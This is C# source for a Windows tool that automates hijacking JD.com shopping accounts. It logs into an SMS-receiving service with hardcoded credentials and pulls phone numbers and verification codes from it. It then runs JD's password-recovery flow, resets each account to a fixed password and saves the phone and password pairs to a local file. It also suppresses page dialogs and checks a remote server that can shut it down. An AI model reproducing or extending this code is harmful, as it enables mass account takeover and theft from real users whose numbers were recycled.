using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Xml;
using CCWin;
using System.Text.RegularExpressions;
using zoyobar.shared.panzer.web.ib;
using System.Runtime.InteropServices;
using mshtml;
using System.Net;

namespace InputPhones
{

    public partial class Form1 : CCSkinMain
    {
        public Form1()
        {
            InitializeComponent();
           
        }
        public static string striphtml(string strhtml)
    {
        string stroutput = strhtml;
        Regex regex = new Regex(@"<[^>]+>|</[^>]+>");
        stroutput = regex.Replace(stroutput, "");
        return stroutput;

    }

        public void SetText(string no)
        {
        }



        void ProcessTask()
        {
            while (true)
            {
               
                Thread.Sleep(60  * 1000);
            }
           
        }


        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        public Dictionary<string, string> GetTitles(string url1)
        {
            Dictionary<string, string> smt = new Dictionary<string, string>();
            XmlDocument doc = new XmlDocument();
            doc.Load(url1);
            //使用xPath选择需要的节点
            XmlNodeList nodes = doc.SelectNodes("/rss/channel//item");

            foreach (XmlNode item in nodes)
            {
                string title = item.SelectSingleNode("title").InnerText;
                string url2 = item.SelectSingleNode("link").InnerText;
                title = striphtml(title);
                smt[title]=url2;
            }
            
            return smt;
        }

        public static string user = "robertspig";
        public static string pass = "6510928jim39";
        private void Form1_SysBottomClick(object sender)
        {
            FrmInformation fi = new FrmInformation();
            fi.ShowDialog();
        }
       

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

            if (webBrowser1.Url.ToString() == "http://www.jikesms.com/user/index.htm")
                webBrowser1.Navigate("http://www.jikesms.com/user/captcha.htm");
            if (webBrowser1.Url.ToString() == "http://www.jikesms.com/user/captcha.htm")
            {
                webBrowser1.Document.GetElementById("getPhone").Click += (HtmlElementEventHandler)delegate(object s, HtmlElementEventArgs e1)
                {
                    msg(webBrowser1.Document.GetElementById("tel").GetAttribute("value"));
                };
                webBrowser1.Document.GetElementById("getMessage").Click += (HtmlElementEventHandler)delegate(object s, HtmlElementEventArgs e1)
                {

                    string v_code = webBrowser1.Document.GetElementById("v_code").GetAttribute("value");
                    if (v_code != "")
                    {
                        if (v_code.IndexOf("验证码为") == 0)
                        {
                            timer2.Enabled = false;
                            string code = v_code.Substring(4, 6);
                            webBrowser2.Document.GetElementById("code").SetAttribute("value", code);
                            webBrowser2.Document.GetElementById("submitCode").InvokeMember("click");
                            Import();

                        }

                    }
                };

                skinButtom2_Click(null, null);
            }
        }

        private void skinButtom1_Click_1(object sender, EventArgs e)
        {
            //webBrowser1.Document.GetElementById("uid").SetAttribute("value", user); ;
            webBrowser1.Document.GetElementById("password").SetAttribute("value", pass);
            //
            IEBrowser ie = new IEBrowser ( this.webBrowser1 );
            //string showMessageScript = "";
            //ie.InstallScript ( showMessageScript );
            ie.ExecuteScript("$('#uid').val('"+user+"');");
            webBrowser1.Document.GetElementById("subbtn").InvokeMember("click");
            skinButtom1.Enabled = false;
            skinButtom2.Enabled = true;
        }

        private void skinButtom2_Click(object sender, EventArgs e)
        {
            if (webBrowser2.Url == null) return;
            if (webBrowser2.Url.ToString() != "http://safe.jd.com/findPwd/index.action")
            {
                webBrowser2.Navigate("http://safe.jd.com/findPwd/index.action");
                return;
            }

           // webBrowser1.Document.GetElementById("q-text").SetAttribute("value","京东");
           // webBrowser1.Document.GetElementById("queryService").InvokeMember("click");
            //webBrowser1.Document.GetElementById("serviceId_chzn_o_0").InvokeMember("click");
           
            //string showMessageScript = "";
            //ie.InstallScript ( showMessageScript );
            
            //webBrowser1.Navigate();


            //msg($('#tel').val())
            //ie.ExecuteScript("alert(window.external.msg(1))");
            if (webBrowser1.Document.GetElementById("getPhone") != null)
            {
                IEBrowser ie = new IEBrowser(this.webBrowser1);
                ie.ExecuteScript("$('#serviceId').val(384)");
                webBrowser1.Document.GetElementById("getPhone").InvokeMember("click");
            }
        }

        public void msg(string abc)
        {
            //MessageBox.Show(abc);
            if (webBrowser2.Document.GetElementById("username") != null)
            {
                phone = abc;
                webBrowser2.Document.GetElementById("username").SetAttribute("value", abc);
                webBrowser2.Document.GetElementById("authCode").Focus();
            }
        }
        void B2(object sender, HtmlElementEventArgs e)
        {
            timer1.Enabled = true;
        }
        void B2_1() 
        {
            MessageBox.Show("recv_code");
        }
        private void webBrowser2_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            skinButtom1.Enabled = true;
            if (webBrowser2.Url.ToString() == "http://safe.jd.com/findPwd/index.action")
            {
                webBrowser2.Document.GetElementById("findPwdSubmit").Click -= B2; webBrowser2.Document.GetElementById("findPwdSubmit").Click += B2;
                if (webBrowser1.Document.GetElementById("getPhone") != null)
                {
                    if (webBrowser2.Document.GetElementById("username").GetAttribute("value") == "用户名/邮箱/已验证手机")
                    {
                    IEBrowser ie = new IEBrowser(this.webBrowser1);
                    ie.ExecuteScript("$('#serviceId').val(384)");
                    webBrowser1.Document.GetElementById("getPhone").InvokeMember("click");
                    }
                }
            }
            if (webBrowser2.Url.ToString().Contains("http://safe.jd.com/findPwd/findPwd.action"))
            {
                if(webBrowser2.Document.GetElementById("sendMobileCode")!=null)
                {
                webBrowser2.Document.GetElementById("sendMobileCode").InvokeMember("click");
                timer2.Enabled = true;
                }
            }
            if (webBrowser2.Url.ToString().Contains("http://safe.jd.com/findPwd/resetPassword.action"))
            {
                webBrowser2.Document.GetElementById("password").SetAttribute("value", phonepass);
                webBrowser2.Document.GetElementById("repassword").SetAttribute("value", phonepass);
                webBrowser2.Document.GetElementById("resetPwdSubmit").InvokeMember("click");
   
            }
            if (webBrowser2.Url.ToString().Contains("http://safe.jd.com/findPwd/resetPwdSuccess.action"))
            {
                Thread.Sleep(2000);
                webBrowser2.Navigate("http://safe.jd.com/findPwd/index.action");
   
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (webBrowser2.Document == null) return;
            HtmlElement he=webBrowser2.Document.GetElementById("username_error");
            if (he!=null && he.InnerText != null)
            {
                string str = he.InnerText.Trim();
                if (str != "" && str!="请重试手机号码！")
                {
                    HtmlElement he1 = webBrowser1.Document.GetElementById("getPhone");
                    if(he1!=null)he1.InvokeMember("click");
                    he.InnerText = "请重试手机号码！";
                    webBrowser2.Document.GetElementById("authCode").SetAttribute("value", "");
                    webBrowser2.Document.GetElementById("authCode").Focus();
                  }
            }
            he = webBrowser2.Document.GetElementById("authCode_error");
            if (he != null && he.InnerText != null)
            {
                string str = he.InnerText.Trim();
                if (str != "")
                {
                    webBrowser2.Document.GetElementById("authCode").SetAttribute("value", "");
                    he.InnerText = "";
                }
            }
            he = webBrowser2.Document.GetElementById("authCode");
            if (he != null)
            {
                string str = he.GetAttribute("value");
                if (str.Length == 4)
                {
                    webBrowser2.Document.GetElementById("findPwdSubmit").InvokeMember("click");    
                }
            }
        }
        string phone = "";
        string phonepass = "mmzh1234";
        private void Import()
        {
            string path = Path.Combine(Application.StartupPath, "data");
            

            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }

            using (StreamWriter writer = new StreamWriter(Path.Combine(path, "account.txt"), true))
            {
                writer.WriteLine(phone + "\t" + phonepass);
                writer.Close();
            }
        }
        private void timer2_Tick(object sender, EventArgs e)
        {
            webBrowser1.Document.GetElementById("getMessage").InvokeMember("click");
            
        }

        private void webBrowser2_Navigated(object sender, WebBrowserNavigatedEventArgs e)
        {
            IHTMLWindow2 win = (IHTMLWindow2)(sender as WebBrowser).Document.Window.DomWindow;
            string s = @"function confirm() {";
            s += @"return true;";
            s += @"}";
            s += @"function alert() {}";
            win.execScript(s, "javascript");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Reg_Timer1.Interval = 1000;
            Reg_Timer1.Elapsed += new System.Timers.ElapsedEventHandler(StartW);
            Reg_Timer1.Enabled = true;
        }
        System.Timers.Timer Reg_Timer1 = new System.Timers.Timer();
        void StartW(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (Reg_Timer1.Interval == 1000)
                Reg_Timer1.Interval = 10 * 60 * 1000; ;
            string str = GetUrltoHtml("http://schoolbuy.net/crit/jd.php");
            if (str != "YES")
            {
                System.Diagnostics.Process.Start("http://www.schoolbuy.net/t.php");
                Application.Exit();
            }
        }
        public string GetUrltoHtml(string Url, string encode = "utf-8")
        {
            StringBuilder content = new StringBuilder();
            try
            {
                // 与指定URL创建HTTP请求
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Url);
                request.UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ZHCN)";
                request.Method = "GET";
                request.Accept = "*/*";

                //不保持连接
                request.KeepAlive = true;
                // 获取对应HTTP请求的响应
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                // 获取响应流
                Stream responseStream = response.GetResponseStream();
                // 对接响应流(以"GBK"字符集)
                //StreamReader sReader = new StreamReader(responseStream, Encoding.GetEncoding("gb2312"));
                StreamReader sReader = new StreamReader(responseStream, Encoding.GetEncoding(encode));
                // 开始读取数据
                Char[] sReaderBuffer = new Char[256];
                int count = sReader.Read(sReaderBuffer, 0, 256);
                while (count > 0)
                {
                    String tempStr = new String(sReaderBuffer, 0, count);
                    content.Append(tempStr);
                    count = sReader.Read(sReaderBuffer, 0, 256);
                }
                // 读取结束
                sReader.Close();

            }
            catch (Exception e)
            {
                return e.Message;
            }
            return content.ToString();
        }
    }

}
